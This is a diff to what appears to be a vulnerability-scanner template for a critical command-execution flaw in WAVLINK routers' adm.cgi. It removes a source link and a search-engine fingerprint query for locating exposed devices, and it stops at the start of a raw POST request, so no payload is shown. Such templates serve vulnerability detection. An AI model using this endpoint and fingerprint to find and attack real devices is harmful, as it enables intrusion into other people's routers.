@@ -3,14 +3,8 @@ info:
   name: WAVLINKadm.cgi命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dd772e1671d5769d14203c355aaa3b9d
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dd772e1671d5769d14203c355aaa3b9d
-    fofa: + hunter`web.body="firstFlage"`
 http:
 - raw:
   - 'POST /cgi-bin/adm.cgi HTTP/1.1
